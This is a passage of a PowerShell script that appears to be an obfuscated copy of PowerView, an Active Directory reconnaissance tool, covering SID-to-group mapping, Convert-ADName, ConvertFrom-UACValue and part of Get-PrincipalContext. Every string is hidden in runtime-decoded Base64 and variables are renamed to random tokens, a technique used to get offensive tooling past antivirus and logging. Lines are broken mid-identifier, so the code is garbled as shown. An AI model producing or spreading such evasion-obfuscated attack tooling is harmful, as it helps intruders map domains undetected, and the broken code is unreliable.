$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) 
}
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
         
           $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcw
A='))) }
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA')
)) }
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA==')
)) }
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA')
)) }
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
         
           $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIA
BDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                 
   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcw
BlAHIAcwA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQ
B0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVA
ByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdA
BvAHIAIABVAHMAZQByAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQ
BzAGUAcgBzAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQ
B0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                 
   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATA
BpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQ
BzAGUAcgBzAA=='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQ
ByAGEAdABvAHIAcwA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcw
A='))) }
                    $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQ
BjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcw
AgAFMAZQByAHYAZQByAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdg
BlAHIAcwA='))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQ
ByAHYAZQByAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcg
BhAHQAbwByAHMA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcw
BzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
             
       $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  
{ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcw
BzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
             
       Default {
                        Convert-ADName -Identity 
${e12fad257af9417d951d1e88fc2951fd} 
@e95ff9a0cfb548dba5f1385fe67fc468
                    }
               
 }
            }
            catch {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBTAEkARABdACAARQByAHIAbwByACAAYw
BvAG4AdgBlAHIAdABpAG4AZwAgAFMASQBEACAAJwAkAHsAZQAxADIAZgBhAGQAMgA1AD
cAYQBmADkANAAxADcAZAA5ADUAMQBkADEAZQA4ADgAZgBjADIAOQA1ADEAZgBkAH0AJw
AgADoAIAAkAF8A')))
            }
        }
    }
}
function Convert-
ADName {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType
([String])]
    [CmdletBinding()]
    Param(
        [Parameter
(Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 
'ObjectName')]
        [String[]]
        $Identity,
        [String]
   
     [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 
'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 
'CanonicalEx', 'SPN')]
        $OutputType,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${d0b48f68b8b448c3a68dae36d974e6d9} = @{
            'DN'             
   =   1  
            'Canonical'         =   2  
            'NT4'   
            =   3  
            'Display'           =   4  
           
 'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
  
          'GUID'              =   7  
            'Unknown'           
=   8  
            'UPN'               =   9  
            
'CanonicalEx'       =   10 
            'SPN'               =   11 
   
         'SID'               =   12 
        }
        function 
Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) 
{
            ${5cfffc0ad0f94214bae0585e8079600f} = $Null
            
${5cfffc0ad0f94214bae0585e8079600f} = $Object.GetType
().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), 
$NULL, $Object, $Parameters)
            Write-Output 
${5cfffc0ad0f94214bae0585e8079600f}
        }
        function Get-
Property([__ComObject] $Object, [String] $Property) {
            
$Object.GetType().InvokeMember($Property, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $NULL)
       
 }
        function Set-Property([__ComObject] $Object, [String] 
$Property, $Parameters) {
            [Void] $Object.GetType
().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), 
$NULL, $Object, $Parameters)
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) {
            
${93ed5685758446c99afe9fdeeb84f126} = 2
            
${c13ea9c60c0d44de86be6ab5614ed234} = $Server
        }
        elseif 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            
${93ed5685758446c99afe9fdeeb84f126} = 1
            
${c13ea9c60c0d44de86be6ab5614ed234} = $Domain
        }
        elseif 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bd891b8efc41462d9e923cefa3d67734} = 
$Credential.GetNetworkCredential()
            
${93ed5685758446c99afe9fdeeb84f126} = 1
            
${c13ea9c60c0d44de86be6ab5614ed234} = 
${bd891b8efc41462d9e923cefa3d67734}.Domain
        }
        else {
    
        ${93ed5685758446c99afe9fdeeb84f126} = 3
            
${c13ea9c60c0d44de86be6ab5614ed234} = $Null
        }
    }
    PROCESS 
{
        ForEach ($TargetIdentity in $Identity) {
            if (-
not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
   
             if ($TargetIdentity -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) 
{
                    ${310f793d0bea4d69a16a36cd79ac5ce5} = 
${d0b48f68b8b448c3a68dae36d974e6d9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))]
                }
             
   else {
                    ${310f793d0bea4d69a16a36cd79ac5ce5} = 
${d0b48f68b8b448c3a68dae36d974e6d9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBUADQA')))]
                }
            }
            else {
      
          ${310f793d0bea4d69a16a36cd79ac5ce5} = 
${d0b48f68b8b448c3a68dae36d974e6d9}[$OutputType]
            }
        
    ${7351557d473a4065835b6ab737c0cbe5} = New-Object -ComObject 
NameTranslate
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
          
          ${bd891b8efc41462d9e923cefa3d67734} = 
$Credential.GetNetworkCredential()
                    Invoke-Method 
${7351557d473a4065835b6ab737c0cbe5} 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAGkAdABFAHgA'))) (
                        
${93ed5685758446c99afe9fdeeb84f126},
                        
${c13ea9c60c0d44de86be6ab5614ed234},
                        
${bd891b8efc41462d9e923cefa3d67734}.UserName,
                        
${bd891b8efc41462d9e923cefa3d67734}.Domain,
                        
${bd891b8efc41462d9e923cefa3d67734}.Password
                    )
    
            }
                catch {
                    Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbg
BpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAH
IAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAB1AHMAaQBuAGcAIABhAGwAdABlAHIAbg
BhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgADoAIAAkAF8A')))
           
     }
            }
            else {
                try {
           
         $Null = Invoke-Method ${7351557d473a4065835b6ab737c0cbe5} 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAGkAdAA='))) (
                        
${93ed5685758446c99afe9fdeeb84f126},
                        
${c13ea9c60c0d44de86be6ab5614ed234}
                    )
             
   }
                catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbg
BpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAH
IAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAA6ACAAJABfAA==')))
               
 }
            }
            Set-Property 
${7351557d473a4065835b6ab737c0cbe5} 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
   
             $Null = Invoke-Method 
${7351557d473a4065835b6ab737c0cbe5} 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHQA'))) (8, $TargetIdentity)
                Invoke-Method 
${7351557d473a4065835b6ab737c0cbe5} 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAHQA'))) (${310f793d0bea4d69a16a36cd79ac5ce5})
            }
    
        catch 
[System.Management.Automation.MethodInvocationException] {
           
     Write-Verbose "[Convert-ADName] Error translating 
'$TargetIdentity' : $($_.Exception.InnerException.Message)"
          
  }
        }
    }
}
function ConvertFrom-UACValue {
    [OutputType
('System.Collections.Specialized.OrderedDictionary')]
    
[CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
     
   $Value,
        [Switch]
        $ShowAll
    )
    BEGIN {
        
${7cda12d51f68425b8ffc438e3f05fd81} = New-Object 
System.Collections.Specialized.OrderedDictionary
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBDAFIASQBQAFQA'))), 1)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABPAEMASwBPAFUAVAA='))), 16)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQ
BEAA=='))), 128)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 
256)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVA
A='))), 2048)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVA
A='))), 4096)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 
8192)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 
65536)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
      
  ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
      
  ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 
524288)
        ${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARw
BBAFQASQBPAE4A'))), 16777216)
        
${7cda12d51f68425b8ffc438e3f05fd81}.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA==')
)), 67108864)
    }
    PROCESS {
        
${4be92c325d2f4ca081cab2905449acd8} = New-Object 
System.Collections.Specialized.OrderedDictionary
        if 
($ShowAll) {
            ForEach (${31f162691d5f4e939decf3286c312d49} 
in ${7cda12d51f68425b8ffc438e3f05fd81}.GetEnumerator()) {
            
    if ( ($Value -band ${31f162691d5f4e939decf3286c312d49}.Value) -
eq ${31f162691d5f4e939decf3286c312d49}.Value) {
                    
${4be92c325d2f4ca081cab2905449acd8}.Add
(${31f162691d5f4e939decf3286c312d49}.Name, 
"$(${31f162691d5f4e939decf3286c312d49}.Value)+")
                }
    
            else {
                    
${4be92c325d2f4ca081cab2905449acd8}.Add
(${31f162691d5f4e939decf3286c312d49}.Name, 
"$(${31f162691d5f4e939decf3286c312d49}.Value)")
                }
     
       }
        }
        else {
            ForEach 
(${31f162691d5f4e939decf3286c312d49} in 
${7cda12d51f68425b8ffc438e3f05fd81}.GetEnumerator()) {
               
 if ( ($Value -band ${31f162691d5f4e939decf3286c312d49}.Value) -eq 
${31f162691d5f4e939decf3286c312d49}.Value) {
                    
${4be92c325d2f4ca081cab2905449acd8}.Add
(${31f162691d5f4e939decf3286c312d49}.Name, 
"$(${31f162691d5f4e939decf3286c312d49}.Value)")
                }
     
       }
        }
        ${4be92c325d2f4ca081cab2905449acd8}
    }
}
function Get-PrincipalContext {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, Mandatory = $True)]
        [Alias
('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
    
    [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
       
 [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    Add-Type -
AssemblyName System.DirectoryServices.AccountManagement
    try {
     
   if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity 
-match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if 
($Identity -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                
${2a2d577eda6a4cf89dd1ccea7b42177d} = $Identity | Convert-ADName -
OutputType Canonical
                if 
(${2a2d577eda6a4cf89dd1ccea7b42177d}) {
                    
${e1ee44e75f32448aaf1c487d231d05cb} = 
${2a2d577eda6a4cf89dd1ccea7b42177d}.SubString(0, 
${2a2d577eda6a4cf89dd1ccea7b42177d}.IndexOf('/'))
                    
${d008f3f897ce4d138e37c84316bf37a1} = $Identity.Split('\')[1]
        
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQ
BuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJAB7AGUAMQBlAGUANAA0AG
UANwA1AGYAMwAyADQANAA4AGEAYQBmADEAYwA0ADgANwBkADIAMwAxAGQAMAA1AGMAYg
B9ACcA')))
                }
            }
            else {
           
     ${d008f3f897ce4d138e37c84316bf37a1} = $Identity
                
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQ
BuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnAA
==')))
                ${e1ee44e75f32448aaf1c487d231d05cb} = $Domain
  
          }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcw
BpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA
==')))
                ${a2937286b06c4978969ea53dafc8c4d6} = New-
Object -TypeName 
System.DirectoryServices.AccountManagement.PrincipalContext -
ArgumentList 
([System.DirectoryServices.AccountManagement.ContextType]::Domain, 
${e1ee44e75f32448aaf1c487d231d05cb}, $Credential.UserName, 
$Credential.GetNetworkCredential().Password)
            }
            
else {
                ${a2937286b06c4978969ea53dafc8c4d6} = New-
Object -TypeName 
System.DirectoryServices.AccountManagement.PrincipalContext -
ArgumentList 
([System.DirectoryServices.AccountManagement.ContextType]::Domain, 
${e1ee44e75f32448aaf1c487d231d05cb})
            }
        }
        
else {
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcw
BpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA
==')))
                ${de607b95f2c54c359198e858ea2eaeef} = Get-
Domain | Select-Object -ExpandProperty Name
                
${a2937286b06c4978969ea53dafc8c4d6} = New-Object -TypeName 
System.DirectoryServices.AccountManagement.PrincipalContext -
ArgumentList 
([System.DirectoryServices.AccountManagement.ContextType]::Domain, 
${de607b95f2c54c359198e858ea2eaeef}, $Credential.UserName, 
$Credential.GetNetworkCredential().Password)
            }
            
else {
                ${a2937286b06c4978969ea53dafc8c4d6} = New-
Object -TypeName 
System.DirectoryServices.AccountManagement.PrincipalContext -
ArgumentList 
([System.DirectoryServices.AccountManagement.ContextType]::Domain)
   
         }
            ${d008f3f897ce4d138e37c84316bf37a1} = 
$Identity
        }
